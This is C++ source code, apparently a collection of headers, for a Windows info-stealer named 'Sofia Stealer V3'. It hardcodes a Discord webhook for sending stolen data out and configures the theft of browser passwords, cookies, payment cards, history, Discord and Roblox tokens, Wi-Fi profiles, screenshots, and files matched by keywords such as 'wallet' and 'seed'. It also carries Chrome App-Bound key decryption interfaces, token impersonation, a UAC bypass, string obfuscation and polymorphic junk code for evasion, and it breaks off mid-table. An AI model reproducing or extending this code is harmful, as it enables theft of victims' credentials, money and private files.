#ifndef SOFIA_WEBHOOK_URL
#define SOFIA_WEBHOOK_URL "https://discord.com/api/webhooks/1499616167470301296/f-Zh5QvIFv61_bmYzEj-ze7lDeOiuhmDHG7oFz7Z_tHcIw8yJqVNusB7-F4YXCLZu210"
#endif

#include <windows.h>
#include <string>
#include <vector>
#include <iostream>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>

// Fix macros
#define S(x) std::string(x)
#define OBFS_S(x) std::string(x)
#define OBFS_WEBHOOK() SOFIA_WEBHOOK_URL

#ifndef SLOG
#define SLOG(fmt, ...) 
#define SLOG_INIT() 
#define SLOG_CLOSE() 
#endif

namespace Config {
    inline std::string GetWebhookURL() {
        return OBFS_WEBHOOK();
    }
    inline std::string AppName = S("Sofia Stealer V3");
    inline std::string Version = S("3.1.5");
    inline bool GrabPasswords = true;
    inline bool GrabCookies = true;
    inline bool GrabCards = true;
    inline bool GrabHistory = true;
    inline bool GrabDiscord = true;
    inline bool GrabRoblox = true;
    inline bool GrabFiles = true;
    inline std::vector<std::string> InterestingExtensions = {
        S(".txt"), S(".sql"), S(".pdf"), S(".doc"), S(".docx"), S(".xls"), S(".xlsx")
    };
    inline std::vector<std::string> Keywords = {
        S("pass"), S("word"), S("secret"), S("key"), S("seed"), S("wallet"), S("backup"), S("2fa"), S("mfa")
    };
}

#ifndef SOFIA_DEBUG
#define SOFIA_DEBUG
#endif
namespace Config {
    inline std::string GetWebhookURL() {
        return OBFS_WEBHOOK();
    }
    inline std::string AppName = S("Sofia Stealer V3");
    inline std::string Version = S("3.1.5");
    inline bool GrabPasswords = true;
    inline bool GrabCookies = true;
    inline bool GrabCards = true;
    inline bool GrabHistory = true;
    inline bool GrabDiscord = true;
    inline bool GrabRoblox = true;
    inline bool GrabFiles = true;
    inline std::vector<std::string> InterestingExtensions = {
        S(".txt"), S(".sql"), S(".pdf"), S(".doc"), S(".docx"), S(".xls"), S(".xlsx")
    };
    inline std::vector<std::string> Keywords = {
        S("pass"), S("word"), S("secret"), S("key"), S("seed"), S("wallet"), S("backup"), S("2fa"), S("mfa")
    };
}

#include <windows.h>
#include <string>
#include <vector>
namespace Crypto {
    std::string DecryptDPAPI(const std::vector<BYTE>& data);
    std::vector<BYTE> DecryptAES_GCM(const std::vector<BYTE>& key, const std::vector<BYTE>& iv, const std::vector<BYTE>& aad, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag);
    std::vector<BYTE> DecryptChaCha20Poly1305(const std::vector<BYTE>& key, const std::vector<BYTE>& iv, const std::vector<BYTE>& aad, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag);
    std::vector<BYTE> Base64Decode(const std::string& input);
}

#include <windows.h>
#include <shellapi.h>
#include <commctrl.h>
#include <shlobj.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <wlanapi.h>
#include <ncrypt.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

namespace DynAPI {

    typedef HINTERNET (WINAPI* pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET (WINAPI* pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET (WINAPI* pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL (WINAPI* pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI* pWinHttpReceiveResponse)(HINTERNET, LPVOID);
    typedef BOOL (WINAPI* pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
    typedef BOOL (WINAPI* pWinHttpCloseHandle)(HINTERNET);
    typedef BOOL (WINAPI* pWinHttpSetTimeouts)(HINTERNET, int, int, int, int);
    typedef BOOL (WINAPI* pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
    typedef BOOL (WINAPI* pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);

    typedef SECURITY_STATUS (WINAPI* pNCryptOpenStorageProvider)(NCRYPT_PROV_HANDLE*, LPCWSTR, DWORD);
    typedef SECURITY_STATUS (WINAPI* pNCryptOpenKey)(NCRYPT_PROV_HANDLE, NCRYPT_KEY_HANDLE*, LPCWSTR, DWORD, DWORD);
    typedef SECURITY_STATUS (WINAPI* pNCryptDecrypt)(NCRYPT_KEY_HANDLE, PBYTE, DWORD, VOID*, PBYTE, DWORD, DWORD*, DWORD);
    typedef SECURITY_STATUS (WINAPI* pNCryptFreeObject)(NCRYPT_HANDLE);

    typedef DWORD (WINAPI* pWlanOpenHandle)(DWORD, PVOID, PDWORD, PHANDLE);
    typedef DWORD (WINAPI* pWlanCloseHandle)(HANDLE, PVOID);
    typedef DWORD (WINAPI* pWlanEnumInterfaces)(HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST*);
    typedef DWORD (WINAPI* pWlanGetProfileList)(HANDLE, const GUID*, PVOID, PWLAN_PROFILE_INFO_LIST*);
    typedef DWORD (WINAPI* pWlanGetProfile)(HANDLE, const GUID*, LPCWSTR, PVOID, LPWSTR*, PDWORD, PDWORD);
    typedef VOID  (WINAPI* pWlanFreeMemory)(PVOID);

    typedef HDC    (WINAPI* pCreateCompatibleDC)(HDC);
    typedef HBITMAP(WINAPI* pCreateCompatibleBitmap)(HDC, int, int);
    typedef HGDIOBJ(WINAPI* pSelectObject)(HDC, HGDIOBJ);
    typedef BOOL   (WINAPI* pBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
    typedef BOOL   (WINAPI* pDeleteDC)(HDC);
    typedef BOOL   (WINAPI* pDeleteObject)(HGDIOBJ);

    typedef BOOL (WINAPI* pCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
    typedef BOOL (WINAPI* pCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

    typedef HRESULT (WINAPI* pSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
    typedef BOOL    (WINAPI* pShellExecuteExA)(SHELLEXECUTEINFOA*);

    typedef ULONGLONG (WINAPI* pGetTickCount64)(VOID);
    typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
    typedef BOOL (WINAPI* pTerminateProcess)(HANDLE, UINT);
    typedef DWORD (WINAPI* pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    typedef BOOL (WINAPI* pSetWindowDisplayAffinity)(HWND, DWORD);
    typedef int  (WINAPI* pGetSystemMetrics)(int);
    typedef HWND (WINAPI* pGetDesktopWindow)(VOID);
    typedef HDC  (WINAPI* pGetWindowDC)(HWND);
    typedef int  (WINAPI* pReleaseDC)(HWND, HDC);
    typedef HWND (WINAPI* pFindWindowA)(LPCSTR, LPCSTR);
    typedef BOOL (WINAPI* pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
    typedef BOOL (WINAPI* pGetComputerNameA)(LPSTR, LPDWORD);
    typedef BOOL (WINAPI* pGetUserNameA)(LPSTR, LPDWORD);
    typedef VOID (WINAPI* pGetSystemInfo)(LPSYSTEM_INFO);
    typedef HANDLE (WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL   (WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL   (WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL   (WINAPI* pCloseHandle)(HANDLE);
    typedef LSTATUS (WINAPI* pRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
    typedef LSTATUS (WINAPI* pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS (WINAPI* pRegCloseKey)(HKEY);
    typedef LSTATUS (WINAPI* pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS (WINAPI* pRegQueryValueExW)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef BOOL (WINAPI* pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI* pLookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
    typedef BOOL (WINAPI* pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    typedef BOOL (WINAPI* pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
    typedef BOOL (WINAPI* pImpersonateLoggedOnUser)(HANDLE);
    typedef BOOL (WINAPI* pRevertToSelf)(VOID);
    typedef BOOL (WINAPI* pSetThreadToken)(PHANDLE, HANDLE);
    typedef BOOL (WINAPI* pGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);

    extern pWinHttpOpen             WHttpOpen;
    extern pWinHttpConnect          WHttpConnect;
    extern pWinHttpOpenRequest      WHttpOpenReq;
    extern pWinHttpSendRequest      WHttpSendReq;
    extern pWinHttpReceiveResponse  WHttpRecvResp;
    extern pWinHttpQueryHeaders     WHttpQueryH;
    extern pWinHttpCloseHandle      WHttpCloseH;
    extern pWinHttpSetTimeouts      WHttpSetTime;
    extern pWinHttpQueryDataAvailable WHttpQueryAvail;
    extern pWinHttpReadData         WHttpReadData;

    extern pCryptUnprotectData  CryptUnprotData;
    extern pCryptStringToBinaryA CryptStrBinaryA;

    extern pSHGetFolderPathA SHGetFolderA;
    extern pShellExecuteExA  ShellExecExA;

    extern pRegCreateKeyExW  RegCreateKeyEx;
    extern pRegSetValueExW   RegSetValueEx;
    extern pRegCloseKey      RegClose;
    extern pRegOpenKeyExW    RegOpenKeyEx;
    extern pRegQueryValueExW RegQueryValueEx;

    extern pGlobalMemoryStatusEx     GlobalMemStatusEx;
    extern pGetComputerNameA         GetCompNameA;
    extern pGetUserNameA             GetUserNmA;
    extern pGetSystemInfo            GetSysInfo;
    extern pGetTickCount64           GetTickCount;
    extern pOpenProcess              OpenProc;
    extern pTerminateProcess         TermProc;
    extern pGetModuleFileNameA       GetModFileNameA;
    extern pCreateProcessA           CreateProcA;
    extern pCreateToolhelp32Snapshot CreateSnapshot;
    extern pProcess32First           Proc32First;
    extern pProcess32Next            Proc32Next;
    extern pCloseHandle              CloseH;

    extern pSetWindowDisplayAffinity SetWndDisplayAffinity;
    extern pGetSystemMetrics    GetSysMetrics;
    extern pGetDesktopWindow    GetDesktopWnd;
    extern pGetWindowDC         GetWndDC;
    extern pReleaseDC           RelDC;
    extern pFindWindowA         FindWndA;

    extern pCreateCompatibleDC      CreateCompDC;
    extern pCreateCompatibleBitmap  CreateCompBitmap;
    extern pSelectObject            SelectObj;
    extern pBitBlt                  BitBlt_f;
    extern pDeleteDC                DelDC;
    extern pDeleteObject            DelObj;

    extern pWlanOpenHandle      WlanOpen;
    extern pWlanCloseHandle     WlanClose;
    extern pWlanEnumInterfaces  WlanEnumIfaces;
    extern pWlanGetProfileList  WlanGetProfList;
    extern pWlanGetProfile      WlanGetProf;
    extern pWlanFreeMemory      WlanFree;

    extern pNCryptOpenStorageProvider NCryptOpenStorage;
    extern pNCryptOpenKey             NCryptOpenK;
    extern pNCryptDecrypt             NCryptDecr;
    extern pNCryptFreeObject          NCryptFreeObj;

    extern pOpenProcessToken          OpenProcToken;
    extern pLookupPrivilegeValueA     LookupPrivValueA;
    extern pAdjustTokenPrivileges     AdjustTokPrivs;
    extern pDuplicateTokenEx          DupTokenEx;
    extern pImpersonateLoggedOnUser   ImpersonateLoggedUser;
    extern pRevertToSelf              RevertSelf;
    extern pSetThreadToken            SetThrToken;
    extern pGetTokenInformation       GetTokenInf;

    std::string HttpGet(const std::wstring& host, const std::wstring& path, bool https = true);
    bool Initialize();
}

#include <windows.h>
#include <vector>
#include <string>
#include <map>
namespace SQLite {
    class SQLiteHandler {
    public:
        SQLiteHandler(std::string dbPath);
        bool ReadTable(std::string tableName);
        int GetRowCount() { return (int)_tableEntries.size(); }
        std::vector<std::string> GetFieldNames() { return _fieldNames; }
        std::string GetValue(int rowNum, std::string fieldName) {
            if (rowNum >= 0 && rowNum < (int)_tableEntries.size()) {
                auto it = _tableEntries[rowNum].find(fieldName);
                if (it != _tableEntries[rowNum].end()) return it->second;
            }
            return "";
        }
        std::string GetValue(int rowNum, int fieldIdx) {
            if (rowNum >= 0 && rowNum < (int)_tableEntries.size()) {
                std::string key = (fieldIdx < (int)_fieldNames.size())
                    ? _fieldNames[fieldIdx]
                    : "field_" + std::to_string(fieldIdx);
                auto it = _tableEntries[rowNum].find(key);
                if (it != _tableEntries[rowNum].end()) return it->second;
            }
            return "";
        }
    private:
        std::string _dbPath;
        size_t _fileSize;
        std::vector<uint8_t> _fileBytes;
        std::vector<std::string> _fieldNames;
        std::vector<std::map<std::string, std::string>> _tableEntries;

        void ParsePage(int pageNum, uint16_t pageSize, bool isMaster, int depth = 0);
        void ParseCell(size_t offset, uint16_t pageSize, size_t pageBase, bool isMaster);
        int  ReadVarint(size_t offset, uint64_t& value);
        int  ReadVarint2(const std::vector<uint8_t>& buf, size_t offset, uint64_t& value);
        void ParseFieldsFromSql(std::string sql);
    };
}

#include <windows.h>
#include <objbase.h>
#include <vector>
#include <string>
namespace AppBound {
    enum ProtectionLevel : int {
        PROTECTION_NONE = 0,
        PROTECTION_PATH_VALIDATION = 1,
        PROTECTION_PATH_VALIDATION_WITH_INDIRECTION = 2,
        PROTECTION_MAX = 3
    };
    MIDL_INTERFACE("463ABECF-410D-407F-8AF5-0DF35A005CC8")
    IElevator : public IUnknown {
    public:
        virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
            const WCHAR* crx_path, const WCHAR* browser_appid,
            const WCHAR* browser_version, const WCHAR* session_id,
            DWORD caller_proc_id, ULONG_PTR* proc_handle) = 0;
        virtual HRESULT STDMETHODCALLTYPE EncryptData(
            ProtectionLevel protection_level, const BSTR plaintext,
            BSTR* ciphertext, DWORD* last_error) = 0;
        virtual HRESULT STDMETHODCALLTYPE DecryptData(
            const BSTR ciphertext, BSTR* plaintext, DWORD* last_error) = 0;
    };
    MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
    IElevatorChrome : public IElevator {};
    MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
    IElevatorChromeBeta : public IElevator {};
    MIDL_INTERFACE("42D4A4CF-AE6A-4B4F-A8D5-BC4C45AC757A")
    IElevatorChromeDev : public IElevator {};
    MIDL_INTERFACE("89D73AE1-BFEF-4B5A-9F7E-DBC73E0059FA")
    IElevatorChromeCanary : public IElevator {};
    MIDL_INTERFACE("1F4DE4B7-C285-4A1F-9884-2C7F45F94E0E")
    IElevatorEdge : public IElevator {};
    std::vector<BYTE> DecryptAppBoundKey(const std::vector<BYTE>& ciphertext);
    std::vector<BYTE> DeriveV20MasterKey(const std::vector<BYTE>& encryptedKeyBlob);
    std::string DecryptAppBoundValue(const std::vector<BYTE>& encrypted, const std::vector<BYTE>& appBoundKey);
}

#include <windows.h>
namespace Utils {
    class Impersonator {
    public:
        Impersonator();
        ~Impersonator();
        static bool IsAdmin();
        bool IsImpersonating() const { return _impersonating; }
    private:
        bool _impersonating = false;
        bool EnablePrivilege(LPCSTR privilege);
        DWORD GetProcessIdByName(LPCSTR name);
    };
}

#include <windows.h>
#include <string>
namespace Utils {
    namespace UACBypass {
        void ExecuteAdmin();
    }
}

#include <string>
#include <vector>
#include <intrin.h>
namespace Obfuscator {
    static constexpr unsigned char SBOX[256] = {
        0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
        0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
        0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
        0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
        0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
        0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
        0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
        0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
        0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
        0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
        0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
        0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
        0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
        0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
        0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
        0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16,
    };

    static constexpr unsigned char INV_SBOX[256] = {
        0x52,0x09,0x6A,0xD5,0x30,0x36,0xA5,0x38,0xBF,0x40,0xA3,0x9E,0x81,0xF3,0xD7,0xFB,
        0x7C,0xE3,0x39,0x82,0x9B,0x2F,0xFF,0x87,0x34,0x8E,0x43,0x44,0xC4,0xDE,0xE9,0xCB,
        0x54,0x7B,0x94,0x32,0xA6,0xC2,0x23,0x3D,0xEE,0x4C,0x95,0x0B,0x42,0xFA,0xC3,0x4E,
        0x08,0x2E,0xA1,0x66,0x28,0xD9,0x24,0xB2,0x76,0x5B,0xA2,0x49,0x6D,0x8B,0xD1,0x25,
        0x72,0xF8,0xF6,0x64,0x86,0x68,0x98,0x16,0xD4,0xA4,0x5C,0xCC,0x5D,0x65,0xB6,0x92,
        0x6C,0x70,0x48,0x50,0xFD,0xED,0xB9,0xDA,0x5E,0x15,0x46,0x57,0xA7,0x8D,0x9D,0x84,
        0x90,0xD8,0xAB,0x00,0x8C,0xBC,0xD3,0x0A,0xF7,0xE4,0x58,0x05,0xB8,0xB3,0x45,0x06,
        0xD0,0x2C,0x1E,0x8F,0xCA,0x3F,0x0F,0x02,0xC1,0xAF,0xBD,0x03,0x01,0x13,0x8A,0x6B,
        0x3A,0x91,0x11,0x41,0x4F,0x67,0xDC,0xEA,0x97,0xF2,0xCF,0xCE,0xF0,0xB4,0xE6,0x73,
        0x96,0xAC,0x74,0x22,0xE7,0xAD,0x35,0x85,0xE2,0xF9,0x37,0xE8,0x1C,0x75,0xDF,0x6E,
        0x47,0xF1,0x1A,0x71,0x1D,0x29,0xC5,0x89,0x6F,0xB7,0x62,0x0E,0xAA,0x18,0xBE,0x1B,
        0xFC,0x56,0x3E,0x4B,0xC6,0xD2,0x79,0x20,0x9A,0xDB,0xC0,0xFE,0x78,0xCD,0x5A,0xF4,
        0x1F,0xDD,0xA8,0x33,0x88,0x07,0xC7,0x31,0xB1,0x12,0x10,0x59,0x27,0x80,0xEC,0x5F,
        0x60,0x51,0x7F,0xA9,0x19,0xB5,0x4A,0x0D,0x2D,0xE5,0x7A,0x9F,0x93,0xC9,0x9C,0xEF,
        0xA0,0xE0,0x3B,0x4D,0xAE,0x2A,0xF5,0xB0,0xC8,0xEB,0xBB,0x3C,0x83,0x53,0x99,0x61,
        0x17,0x2B,0x04,0x7E,0xBA,0x77,0xD6,0x26,0xE1,0x69,0x14,0x63,0x55,0x21,0x0C,0x7D,
    };

    constexpr unsigned char DeriveKey(int baseKey, size_t index) {
        unsigned char k = (unsigned char)(baseKey ^ (index * 0x53));
        k = (unsigned char)((k << 3) | (k >> 5));                
        k ^= (unsigned char)((index + 0x7F) & 0xFF);
        k = SBOX[k];                                              
        k = (unsigned char)(k * 0xB7);
        k ^= (unsigned char)((index >> 1) ^ 0xC5);
        k = (unsigned char)((k << 2) | (k >> 6));                
        k ^= SBOX[(unsigned char)(index ^ 0x3A)];                
#ifdef POLY_SEED
        unsigned char ps = (unsigned char)((POLY_SEED >> (index % 20)) & 0xFF);
        k ^= ps;
        k = (unsigned char)((k << 1) | (k >> 7));
        k = SBOX[(unsigned char)(k ^ ps)];                        
        k = (unsigned char)(k * 0x9D + ps);
        k ^= (unsigned char)((POLY_SEED >> 8) & 0xFF);
#endif
        return k ? k : (unsigned char)0x42;
    }

    template <size_t N, int K>
    class XorString {
    private:
        char _data[N];
    public:
        constexpr XorString(const char* str) : _data{} {
            for (size_t i = 0; i < N; ++i) {
                unsigned char plain = (unsigned char)str[i];
                unsigned char key = DeriveKey(K, i);
                unsigned char xored = plain ^ key;

                _data[i] = (char)SBOX[xored];
            }
        }
        std::string decrypt() const {
            std::string result;
            result.reserve(N);
            const volatile char* vd = (const volatile char*)_data;
            for (size_t i = 0; i < N; ++i) {
                unsigned char enc = (unsigned char)vd[i];
                unsigned char key = DeriveKey(K, i);

                char c = (char)(INV_SBOX[enc] ^ key);
                if (c != 0) result += c;
            }
            return result;
        }
        const char* decrypt_raw(char* out) const {
            const volatile char* vd = (const volatile char*)_data;
            for (size_t i = 0; i < N; ++i) {
                unsigned char enc = (unsigned char)vd[i];
                unsigned char key = DeriveKey(K, i);
                out[i] = (char)(INV_SBOX[enc] ^ key);
            }
            return out;
        }
    };

    template <size_t N, int K>
    class XorWideString {
    private:
        wchar_t _data[N];
    public:
        constexpr XorWideString(const wchar_t* str) : _data{} {
            for (size_t i = 0; i < N; ++i) {
                unsigned char kHi = DeriveKey(K, i * 2);
                unsigned char kLo = DeriveKey(K, i * 2 + 1);
                wchar_t wkey = (wchar_t)((kHi << 8) | kLo);
                wchar_t xored = str[i] ^ wkey;

                unsigned char hi = SBOX[(unsigned char)(xored >> 8)];
                unsigned char lo = SBOX[(unsigned char)(xored & 0xFF)];
                _data[i] = (wchar_t)((hi << 8) | lo);
            }
        }
        void decrypt_buf(wchar_t* out) const {
            for (size_t i = 0; i < N; ++i) {
                unsigned char kHi = DeriveKey(K, i * 2);
                unsigned char kLo = DeriveKey(K, i * 2 + 1);
                wchar_t wkey = (wchar_t)((kHi << 8) | kLo);

                unsigned char hi = INV_SBOX[(unsigned char)(_data[i] >> 8)];
                unsigned char lo = INV_SBOX[(unsigned char)(_data[i] & 0xFF)];
                out[i] = (wchar_t)((hi << 8) | lo) ^ wkey;
            }
        }
        static constexpr size_t length() { return N > 0 ? N - 1 : 0; }
    };

    class AutoWipeString {
    private:
        std::string _s;
    public:
        AutoWipeString(std::string&& s) : _s(std::move(s)) {}
        ~AutoWipeString() {
            if (!_s.empty()) {
                volatile char* p = (volatile char*)&_s[0];
                for (size_t i = 0; i < _s.size(); i++) p[i] = 0;
                _s.clear();
                _s.shrink_to_fit();
            }
        }
        AutoWipeString(const AutoWipeString&) = delete;
        AutoWipeString& operator=(const AutoWipeString&) = delete;
        AutoWipeString(AutoWipeString&& o) noexcept : _s(std::move(o._s)) {}
        const char* c_str() const { return _s.c_str(); }
        const std::string& str() const { return _s; }
        size_t size() const { return _s.size(); }
        bool empty() const { return _s.empty(); }
        operator const std::string&() const { return _s; }
    };

    static __forceinline void SecureWipeMemory(void* ptr, size_t len) {
        volatile unsigned char* p = (volatile unsigned char*)ptr;
        for (size_t i = 0; i < len; i++) p[i] = 0x00;
        for (size_t i = 0; i < len; i++) p[i] = 0xFF;
        for (size_t i = 0; i < len; i++) p[i] = 0x00;
    }

    static __forceinline void SecureWipeString(std::string& s) {
        if (!s.empty()) {
            volatile char* p = (volatile char*)&s[0];
            for (size_t i = 0; i < s.size(); i++) p[i] = 0;
            for (size_t i = 0; i < s.size(); i++) p[i] = (char)0xFF;
            for (size_t i = 0; i < s.size(); i++) p[i] = 0;
            s.clear();
            s.shrink_to_fit();
        }
    }

    static __forceinline void SecureWipeVector(std::vector<unsigned char>& v) {
        if (!v.empty()) {
            volatile unsigned char* p = (volatile unsigned char*)v.data();
            for (size_t i = 0; i < v.size(); i++) p[i] = 0x00;
            for (size_t i = 0; i < v.size(); i++) p[i] = 0xFF;
            for (size_t i = 0; i < v.size(); i++) p[i] = 0x00;
            v.clear();
            v.shrink_to_fit();
        }
    }

    static __forceinline void SecureWipeWide(wchar_t* p, size_t count) {
        volatile wchar_t* vp = (volatile wchar_t*)p;
        for (size_t i = 0; i < count; i++) vp[i] = 0;
        for (size_t i = 0; i < count; i++) vp[i] = (wchar_t)0xFFFF;
        for (size_t i = 0; i < count; i++) vp[i] = 0;
    }
}

#ifndef OBFS_KEY
#define OBFS_KEY 0xAD
#endif
#define OBFS_S(str) Obfuscator::XorString<sizeof(str), (OBFS_KEY ^ __COUNTER__)>(str).decrypt()
#define OBFS_SA(str) Obfuscator::AutoWipeString(Obfuscator::XorString<sizeof(str), (OBFS_KEY ^ __COUNTER__)>(str).decrypt())
#define OBFS_W_DECL(varName, wstr) \
    static constexpr auto _xw_##varName = Obfuscator::XorWideString<sizeof(wstr)/sizeof(wchar_t), (OBFS_KEY ^ __COUNTER__)>(wstr); \
    wchar_t varName[sizeof(wstr)/sizeof(wchar_t)]; \
    _xw_##varName.decrypt_buf(varName);
#define OBFS_W_WIPE(varName) Obfuscator::SecureWipeWide(varName, sizeof(varName)/sizeof(wchar_t))

#define SECURE_WIPE_S(s) Obfuscator::SecureWipeString(s)
#define SECURE_WIPE_V(v) Obfuscator::SecureWipeVector(v)
#define SECURE_WIPE_M(p, len) Obfuscator::SecureWipeMemory(p, len)

#ifndef S
#define S(str) OBFS_S(str)
#endif

#ifndef JUNK_CODE_1
#define JUNK_CODE_1 \
    { volatile int x = 100; for(int i=0; i<10; i++) x += i; if(x < 0) x = 0; }
#endif
#ifndef JUNK_CODE_2
#define JUNK_CODE_2 \
    { volatile char b[8]; for(int i=0; i<8; i++) b[i] = (char)(i * 3); }
#endif
#ifndef JUNK_CODE_3
#define JUNK_CODE_3 \
    { volatile unsigned k = 0xDEAD; k ^= (k << 5); k *= 0x1337; k ^= (k >> 7); }
#endif
#ifndef JUNK_CODE_4
#define JUNK_CODE_4 \
    { volatile short a[4] = {0x41,0x5A,0x30,0x39}; for(int i=0;i<4;i++) a[i] ^= (short)(i*7+3); }
#endif
#ifndef JUNK_CODE_SMALL
#define JUNK_CODE_SMALL JUNK_CODE_1
#endif
#ifndef JUNK_CODE_LARGE
#define JUNK_CODE_LARGE JUNK_CODE_1 JUNK_CODE_2 JUNK_CODE_3
#endif

#ifndef SOFIA_WEBHOOK_URL
#define SOFIA_WEBHOOK_URL "https://discord.com/api/webhooks/1499616167470301296/f-Zh5QvIFv61_bmYzEj-ze7lDeOiuhmDHG7oFz7Z_tHcIw8yJqVNusB7-F4YXCLZu210"
#endif
#define OBFS_WEBHOOK() OBFS_S(SOFIA_WEBHOOK_URL)

#include <windows.h>
#include <intrin.h>

#ifndef POLY_SEED
#define POLY_SEED 0
#endif
#ifndef JUNK_LEVEL
#define JUNK_LEVEL 3
#endif

namespace Polymorph {

    static __forceinline DWORD FastRand() {
        static DWORD s_state = 0;
        if (s_state == 0) {
            unsigned __int64 tsc = __rdtsc();
            s_state = (DWORD)(tsc ^ (tsc >> 17)) ^ (DWORD)(POLY_SEED);
#ifdef _WIN64
            s_state ^= (DWORD)__readgsqword(0x40);
#else
            s_state ^= (DWORD)__readfsdword(0x20);
#endif
            ULONG_PTR sp = (ULONG_PTR)&s_state;
            s_state ^= (DWORD)(sp >> 3);
            if (s_state == 0) s_state = 0xA5A5A5A5;
        }

        s_state ^= s_state << 13;
        s_state ^= s_state >> 17;
        s_state ^= s_state << 5;
        return s_state;
    }

    static __forceinline DWORD FastRandRange(DWORD maxVal) {
        if (maxVal == 0) return 0;
        return FastRand() % maxVal;
    }

#ifdef _WIN64

    struct JunkEntry {
        unsigned char bytes[9];
        unsigned char len;
    };

    static const JunkEntry g_junkTable[] = {

        {{ 0x90 },                                     1 },  

        {{ 0x66, 0x90 },                               2 },  

        {{ 0x0F, 0x1F, 0x00 },                         3 },  
        {{ 0x48, 0x87, 0xDB },                         3 },  
        {{ 0x48, 0x87, 0xF6 },                         3 },  
